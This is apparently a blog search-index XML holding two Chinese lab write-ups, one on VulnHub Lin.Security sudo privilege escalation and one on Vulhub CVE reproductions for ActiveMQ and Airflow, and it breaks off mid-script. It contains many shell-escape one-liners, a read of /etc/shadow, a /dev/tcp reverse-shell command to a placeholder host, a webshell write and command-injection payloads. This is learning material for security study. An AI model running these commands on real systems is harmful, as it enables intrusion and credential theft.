<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>VulnHub-Lin-Security1靶机渗透学习</title>
    <link href="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="VulnHub-Lin-Security-1-靶机渗透学习"><a href="#VulnHub-Lin-Security-1-靶机渗透学习" class="headerlink" title="VulnHub-Lin.Security: 1-靶机渗透学习"></a>VulnHub-Lin.Security: 1-靶机渗透学习</h1><h2 id="登陆账户及密码："><a href="#登陆账户及密码：" class="headerlink" title="登陆账户及密码："></a>登陆账户及密码：</h2><p>普通账户：bob&#x2F;secret</p><p>root账户：root&#x2F;secret123</p><h2 id="靶机网络配置："><a href="#靶机网络配置：" class="headerlink" title="靶机网络配置："></a>靶机网络配置：</h2><p>靶机网络使用netplan配置：<br>登陆root账户进行修改配置文件：<br><img src="VulnHub-Lin-Security1靶机渗透学习/image-20220417152303330.png" alt="image-20220417152303330" style="zoom:50%;" /></p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417152749572.png" class="" title="image-20220417152749572"><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417152848346.png" class="" title="image-20220417152848346"><h2 id="kalissh连接"><a href="#kalissh连接" class="headerlink" title="kalissh连接"></a>kalissh连接</h2><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417153031372.png" class="" title="image-20220417153031372"><h2 id="渗透思路及步骤"><a href="#渗透思路及步骤" class="headerlink" title="渗透思路及步骤"></a>渗透思路及步骤</h2><h3 id="nmap扫描内网"><a href="#nmap扫描内网" class="headerlink" title="nmap扫描内网"></a>nmap扫描内网</h3><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417153309177.png" class="" title="image-20220417153309177"><p>找到目标靶机</p><p>经过……获取到bob权限</p><h4 id="查看所拥有的权限"><a href="#查看所拥有的权限" class="headerlink" title="查看所拥有的权限"></a>查看所拥有的权限</h4><h5 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h5><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417154011664.png" class="" title="image-20220417154011664"><h3 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h3><p>一个简单的轻量级的 Shell，占用资源少，适合运行于低内存环境，但是与下面讲到的 bash shell 完全兼容。</p><p>sudo ash</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417171757471.png" class="" title="image-20220417171757471"><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>一个强大的文本分析工具，相对于grep的查找，sed的编辑，awk在其对数据分析并生成报告时，显得尤为强大。简单来说awk就是把文件逐行的读入，以空格为默认分隔符将每行切片，切开的部分再进行各种分析处理。</p><p>sudo awk ‘BEGIN {system(“&#x2F;bin&#x2F;sh”)}’</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417171855491.png" class="" title="image-20220417171855491"><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>bash shell 是 Linux 的默认 shell，本教程也基于 bash 编写。bash 由 GNU 组织开发，保持了对 sh shell 的兼容性，是各种 Linux 发行版默认配置的 shell。</p><p>sudo bash</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417171958476.png" class="" title="image-20220417171958476"><h3 id="csh"><a href="#csh" class="headerlink" title="csh"></a>csh</h3><p>sh 之后另一个广为流传的 shell 是由柏克莱大学的 Bill Joy 设计的，这个 shell 的语法有点类似C语言，所以才得名为 C shell ，简称为 csh。</p><p>sudo csh</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172056539.png" class="" title="image-20220417172056539"><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><p>在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，但按传统，习惯称curl为下载工具。</p><p>sudo curl file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172156127.png" class="" title="image-20220417172156127"><h3 id="dash"><a href="#dash" class="headerlink" title="dash"></a>dash</h3><p>原来bash是GNU&#x2F;Linux 操作系统中的 &#x2F;bin&#x2F;sh 的符号连接，但由于bash过于复杂，有人把 bash 从 NetBSD 移植到 Linux 并更名为 dash，且&#x2F;bin&#x2F;sh符号连接到dash。Dash Shell 比 Bash Shell 小的多（ubuntu16.04上，bash大概1M，dash只有150K），符合POSIX标准。Ubuntu 6.10开始默认是Dash。</p><p>sudo dash</p><p><img src="C:\Users\sovo\Desktop\image-20220417172248524.png" alt="image-20220417172248524"></p><h3 id="ed"><a href="#ed" class="headerlink" title="ed"></a>ed</h3><p>Linux ed命令是文本编辑器，用于文本编辑。</p><p>ed是Linux中功能最简单的文本编辑程序，一次仅能编辑一行而非全屏幕方式的操作。</p><p>ed命令并不是一个常用的命令，一般使用比较多的是vi 指令。但ed文本编辑器对于编辑大文件或对于在shell脚本程序中进行文本编辑很有用。</p><p>sudo ed</p><p>!&#x2F;bin&#x2F;sh</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172406412.png" class="" title="image-20220417172406412"><h3 id="env"><a href="#env" class="headerlink" title="env"></a>env</h3><p>sudo env &#x2F;bin&#x2F;sh</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172457620.png" class="" title="image-20220417172457620"><h3 id="expect"><a href="#expect" class="headerlink" title="expect"></a>expect</h3><p>expect是一个自动化交互套件，主要应用于执行命令和程序时，系统以交互形式要求输入指定字符串，实现交互通信。</p><p>sudo expect -c ‘spawn &#x2F;bin&#x2F;sh;interact’</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172650075.png" class="" title="image-20220417172650075"><p><strong>find</strong></p><p>Linux find 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p><blockquote><p>sudo find . -exec &#x2F;bin&#x2F;sh ; -quit</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380447_5ffc749fe3e8a35b5dc6d.jpeg" class="" title="1610380447_5ffc749fe3e8a35b5dc6d.png!small?1610380446888"><p><strong>ftp</strong></p><p>Linux ftp命令设置文件系统相关功能。</p><p>FTP是ARPANet的标准文件传输协议，该网络就是现今Internet的前身。</p><blockquote><p>sudo ftp</p><p>!&#x2F;bin&#x2F;sh</p></blockquote><p><strong><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380452_5ffc74a48b549c83fb370.jpeg" class="" title="1610380452_5ffc74a48b549c83fb370.png!small?1610380451433"></strong></p><p><strong>Less</strong></p><p>less 与 more 类似，但使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载整个文件。</p><blockquote><p>sudo less &#x2F;etc&#x2F;passwd</p><p>!&#x2F;bin&#x2F;sh</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380469_5ffc74b599786fbcf1733.jpeg" class="" title="1610380469_5ffc74b599786fbcf1733.png!small?1610380468485"></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380465_5ffc74b1866e12180eed1.jpeg" class="" title="1610380465_5ffc74b1866e12180eed1.png!small?1610380464451"><p><strong>Man</strong></p><p>Linux提供了丰富的帮助手册，当你需要查看某个命令的参数时不必到处上网查找，只要man一下即可。可以使用man man 查看man的使用方法。</p><blockquote><p>Sudo man man</p><p>!&#x2F;bin&#x2F;sh</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380485_5ffc74c596e85e815de8d.jpeg" class="" title="1610380485_5ffc74c596e85e815de8d.png!small?1610380484591"><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380479_5ffc74bfe4d03be26e06f.jpeg" class="" title="1610380479_5ffc74bfe4d03be26e06f.png!small?1610380478882"><p><strong>More</strong></p><p>Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p><blockquote><p>Sudo more &#x2F;etc&#x2F;passwd</p><p>!&#x2F;bin&#x2F;sh</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380492_5ffc74ccf1102ac19f51f.jpeg" class="" title="1610380492_5ffc74ccf1102ac19f51f.png!small?1610380491948"><p><strong>Scp</strong></p><p>Linux scp 命令用于 Linux 之间复制文件和目录。</p><p>scp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令。</p><p>scp 是加密的，rcp 是不加密的，scp 是 rcp 的加强版。</p><blockquote><p>TF&#x3D;$(mktemp)</p><p>echo ‘sh 0&lt;&amp;2 1&gt;&amp;2’ &gt; $TF</p><p>chmod +x “$TF”</p><p>sudo scp -S $TF x y:</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380499_5ffc74d3e5950e6712274.jpeg" class="" title="1610380499_5ffc74d3e5950e6712274.png!small?1610380499115"><p><strong>socat</strong></p><p>socat是一个多功能的网络工具，名字来由是“Socket CAT”，可以看作是netcat的N倍加强版。</p><blockquote><p>sudo socat stdin exec:&#x2F;bin&#x2F;sh</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380504_5ffc74d8d2400140dbb39.jpeg" class="" title="1610380504_5ffc74d8d2400140dbb39.png!small?1610380503874"><p><strong>ssh</strong></p><p>SSH(远程连接工具)连接原理：ssh服务是一个守护进程(demon)，系统后台监听客户端的连接，ssh服务端的进程名为sshd,负责实时监听客户端的请求(IP 端口)，包括公共秘钥等交换等信息。</p><blockquote><p>sudo ssh -o ProxyCommand&#x3D;’;sh 0&lt;&amp;2 1&gt;&amp;2’ x</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380509_5ffc74ddb9816e28e2b3b.jpeg" class="" title="1610380509_5ffc74ddb9816e28e2b3b.png!small?1610380508698"><p><strong>vi</strong></p><p>vi 编辑器是 Linux&#x2F;UNIX 环境下经典的编辑器</p><blockquote><p>sudo vi -c ‘:!&#x2F;bin&#x2F;sh’ &#x2F;dev&#x2F;null</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380515_5ffc74e305ca796293f3b.jpeg" class="" title="1610380515_5ffc74e305ca796293f3b.png!small?1610380513939"><p><strong>zsh</strong></p><p>Zsh属于Shell中的一种，但比Bash好用，而且完全兼容Bash，拥有及其丰富的插件、强大的自动补全能力、以及自定义功能，可以大大提供我们使用Linux的效率.</p><blockquote><p>sudo zsh</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380519_5ffc74e79dbe406a08c65.jpeg" class="" title="1610380519_5ffc74e79dbe406a08c65.png!small?1610380518544"><p><strong>pico</strong></p><p>Linux pico命令用于编辑文字文件。</p><p>pico是个简单易用、以显示导向为主的文字编辑程序，它伴随着处理电子邮件和新闻组的程序pine而来。</p><blockquote><p>sudo pico</p><p>^R^X</p><p>reset; sh 1&gt;&amp;0 2&gt;&amp;0</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380525_5ffc74ed766482c9f1b5f.jpeg" class="" title="1610380525_5ffc74ed766482c9f1b5f.png!small?1610380524404"><p><strong>rvim</strong></p><p>改进的Vi，一个程序员的文本编辑器</p><p>这需要rvim使用Python支持进行编译。前置:py3为Python 3。</p><blockquote><p>sudo rvim -c ‘:python3 import os; os.execl(“&#x2F;bin&#x2F;sh”, “sh”, “-c”, “reset; exec sh”)’</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380530_5ffc74f297c1f87763a9e.jpeg" class="" title="1610380530_5ffc74f297c1f87763a9e.png!small?1610380529487"><p><strong>perl</strong></p><p>Perl一种功能丰富的计算机程序语言，运行在超过100种计算机平台上，适用广泛，从最初是为文本处理而开发的，现在用于各种任务，包括系统管理，Web开发，网络编程，GUI开发等。</p><p>Perl易于使用、高效、完整，而不是美观（小巧，优雅，简约）。同时支持过程和面向对象编程，对文本处理具有强大的内置支持，并且拥有第三方模块之一。 [1] Perl借取了C、sed、awk、shell脚本语言以及很多其他程序语言的特性，其中最重要的特性是它内部集成了正则表达式的功能，以及巨大的第三方代码库CPAN。</p><blockquote><p>sudo perl -e ‘exec “&#x2F;bin&#x2F;sh”;’</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380537_5ffc74f9ad2581fa250d8.jpeg" class="" title="1610380537_5ffc74f9ad2581fa250d8.png!small?1610380536668"><p><strong>tclsh</strong></p><p>tclsh的是含有Tcl解释简单的壳体和可以读取它的标准输入或从文件Tcl命令，并评估它们。</p><p>Tcl是一种脚本语言，是一种基于字符串的命令语言，是一种解释性语言。所谓解释性是指不像其他高级语言需要通过编译和联结，而与其他Shell语言一样，直接对每条语句顺序解释执行。</p><blockquote><p>sudo tclsh</p><p>exec &#x2F;bin&#x2F;sh &lt;@stdin &gt;@stdout 2&gt;@stderr</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380549_5ffc75054cd32238b29b4.jpeg" class="" title="1610380549_5ffc75054cd32238b29b4.png!small?1610380548204"><p><strong>git</strong></p><p>一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。</p><blockquote><p>sudo git -p help config</p><p>!&#x2F;bin&#x2F;sh</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380555_5ffc750b9a9a8ca543048.jpeg" class="" title="1610380555_5ffc750b9a9a8ca543048.png!small?1610380554598"><p><strong>script</strong></p><p>script 是一个神奇命令，script 能够将终端的会话过程录制下来，然后使用 scriptreplay 就可以将其录制的结果播放给他人观看。script 的好处就在于你在终端中的所有操作、敲过的命令和打印出的结果它都可以原原本本地进行录制。可以应用于教学、演示、审计。</p><blockquote><p>sudo script -q &#x2F;dev&#x2F;null</p></blockquote><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380560_5ffc7510ae20ffff836dc.jpeg" class="" title="1610380560_5ffc7510ae20ffff836dc.png!small?1610380559659"><h2 id="hash密码破解"><a href="#hash密码破解" class="headerlink" title="hash密码破解"></a>hash密码破解</h2><p>在想在linux系统中，用户hash加密的密码存储在&#x2F;etc&#x2F;shadow中。如果我们查看&#x2F;etc&#x2F;passwd，可以看到以下内容</p><p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>用户名</td><td>用户登录系统是使用的用户名</td></tr><tr><td>密码</td><td>密码位</td></tr><tr><td>UID</td><td>用户表示号</td></tr><tr><td>GID</td><td>缺省组标识号</td></tr><tr><td>注释性描述</td><td>例如存放用户全名等信息</td></tr><tr><td>宿主目录</td><td>用户登录系统后的缺省目录</td></tr><tr><td>命令解释器</td><td>用户使用的shell，默认为bash</td></tr></tbody></table><p>在靶机是发现passwd文件中存储hash密码</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380590_5ffc752e2d0edf9c17a75.jpeg" class="" title="1610380590_5ffc752e2d0edf9c17a75.png!small?1610380589456"><p>使用john或hashcat进行破解</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/1610380594_5ffc7532b586adeb9df50.jpeg" class="" title="1610380594_5ffc7532b586adeb9df50.png!small?1610380593956"><p>获得账号密码</p><p>insecurity&#x2F;P@ssw0rd</p><h2 id="通配符提权值之tar命令注入"><a href="#通配符提权值之tar命令注入" class="headerlink" title="通配符提权值之tar命令注入"></a>通配符提权值之tar命令注入</h2><p>tar命令注入</p><p>查看发现靶机中存在一个root权限的每分钟执行一次的定时任务</p><img src="/2023/01/05/VulnHub-Lin-Security1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/image-20220417172946052.png" class="" title="image-20220417172946052"><p>看这个脚本的内容，发现使用tar命令分别备份home下的目录</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub复现</title>
    <link href="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="vulhub复现"><a href="#vulhub复现" class="headerlink" title="vulhub复现"></a>vulhub复现</h1><h2 id="activemq"><a href="#activemq" class="headerlink" title="activemq"></a>activemq</h2><h3 id="CVE-2015-5254"><a href="#CVE-2015-5254" class="headerlink" title="CVE-2015-5254"></a>CVE-2015-5254</h3><h4 id="ActiveMQ是什么？"><a href="#ActiveMQ是什么？" class="headerlink" title="ActiveMQ是什么？"></a>ActiveMQ是什么？</h4><p><a href="https://zhuanlan.zhihu.com/p/79264007">https://zhuanlan.zhihu.com/p/79264007</a></p><p>ActiveMQ 是 Apache 出品，最流行的，能力强劲的开源消息总线。ActiveMQ 是一个 完全支持 JMS1.1 和 J2EE 1.4 规范的 JMS Provider 实现，尽管 JMS 规范出台已经是很久 的事情了，但是 JMS 在当今的 J2EE 应用中间仍然扮演着特殊的地位。</p><p>LICENSE  NOTICE  README.txt  activemq-all-5.11.1.jar  bin  conf  data  docs  examples  lib  tmp  webapps  webapps-demo</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>环境运行后，将监听61616和8161两个端口其中61616是工作端口，消息在这个端口进行传递;8161是网络管理页面端口访问<a href="http://192.168.1.120:8161即可看到网络管理页面，不过这个漏洞理论上是不需要网络的。默认的用户名/密码为admin/admin">http://192.168.1.120:8161即可看到网络管理页面，不过这个漏洞理论上是不需要网络的。默认的用户名/密码为admin/admin</a>)</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/ff97801964cf1ba1c11b82c363117292.png" class="" title="ff97801964cf1ba1c11b82c363117292.png"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220820222920265.png" class="" title="image-20220820222920265"><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220821180440522.png" class="" title="image-20220821180440522"><p>工具jmet<a href="https://github.com/matthiaskaiser/jmet">https://github.com/matthiaskaiser/jmet</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/sucess&quot; -Yp ROME 192.168.1.120 61616<br></code></pre></td></tr></table></figure><p><a href="http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event">http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event</a></p><p>点击event即可导致touch  &#x2F;tmp&#x2F;sucess成功执行</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220821181004286.png" class="" title="image-20220821181004286"><p>反弹shell命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">java -jar jmet-<span class="hljs-number">0.1</span>.<span class="hljs-number">0</span>-<span class="hljs-keyword">all</span>.jar -Q event -I ActiveMQ -s -Y <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/12345 0&gt;&amp;1&quot;</span> -Yp ROME <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">61616</span><br>//这条命令无法反弹<span class="hljs-keyword">shell</span>，可能是被拦截了，经实验 base64后可以反弹<span class="hljs-keyword">shell</span><br>java -jar jmet-<span class="hljs-number">0.1</span>.<span class="hljs-number">0</span>-<span class="hljs-keyword">all</span>.jar -Q event -I ActiveMQ -s -Y <span class="hljs-string">&quot;bash -c &#123;echo,base64数据&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -Yp ROME <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">61616</span><br></code></pre></td></tr></table></figure><p>服务器监听端口</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span>  -lnvp <span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220821185255258.png" class="" title="image-20220821185255258"><h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><p>需要管理员&#x2F;用户的点击</p><h3 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h3><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p><p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作</p><p>ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf&#x2F;jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p><h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><p>查看activeMQ的绝对路径</p><p><a href="http://192.168.1.120:8161/admin/test/systemProperties.jsp">http://192.168.1.120:8161/admin/test/systemProperties.jsp</a></p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824132419605.png" class="" title="image-20220824132419605"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824141107422.png" class="" title="image-20220824141107422"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824141140284.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.120:8161/api/shell.jsp?<span class="hljs-built_in">pwd</span>=admin&amp;cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824141205632.png" class=""><h4 id="写入crontab，自动化弹shell"><a href="#写入crontab，自动化弹shell" class="headerlink" title="写入crontab，自动化弹shell"></a>写入crontab，自动化弹shell</h4><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824141518879.png" class="" title="image-20220824141518879"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824141530351.png" class="" title="image-20220824141530351"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824143026152.png" class="" title="image-20220824143026152"><h2 id="airflow"><a href="#airflow" class="headerlink" title="airflow"></a>airflow</h2><h3 id="CVE-2020-11978"><a href="#CVE-2020-11978" class="headerlink" title="CVE-2020-11978"></a>CVE-2020-11978</h3><p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞，未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824160928813.png" class="" title="image-20220824160928813"><p>开启功能</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824161016117.png" class="" title="image-20220824161016117"><p>点击进入</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824161232722.png" class="" title="image-20220824161232722"><p>输入</p><p>{“message”:”‘&quot;;touch &#x2F;tmp&#x2F;airflow_dag_success;#”}</p><p>点击Trigger</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824161336914.png" class="" title="image-20220824161336914"><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824161420233.png" class="" title="image-20220824161420233"><p>执行成功</p><p>进入容器查看命令是否执行</p><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824161821777.png" class="" title="image-20220824161821777"><h3 id="CVE-2020-11981"><a href="#CVE-2020-11981" class="headerlink" title="CVE-2020-11981"></a>CVE-2020-11981</h3><p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前，如果攻击者控制了Celery的消息中间件（如Redis&#x2F;RabbitMQ），将可以通过控制消息，在Worker进程中执行任意命令。</p><p>利用这个漏洞需要控制消息中间件，Vulhub环境中Redis存在未授权访问。通过未授权访问，攻击者可以下发自带的任务<code>airflow.executors.celery_executor.execute_command</code>来执行任意命令，参数为命令执行中所需要的数组。</p><p>我们可以使用<a href="exploit_airflow_celery.py">exploit_airflow_celery.py</a>这个小脚本来执行命令<code>touch /tmp/airflow_celery_success</code>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pip install redispython exploit_airflow_celery<span class="hljs-selector-class">.py</span> <span class="hljs-selector-attr">[your-ip]</span><br></code></pre></td></tr></table></figure><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824162607716.png" class="" title="image-20220824162607716"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> sys<br>r = redis.Redis(host=sys.argv[<span class="hljs-number">1</span>], port=<span class="hljs-number">6379</span>, decode_responses=<span class="hljs-literal">True</span>,db=<span 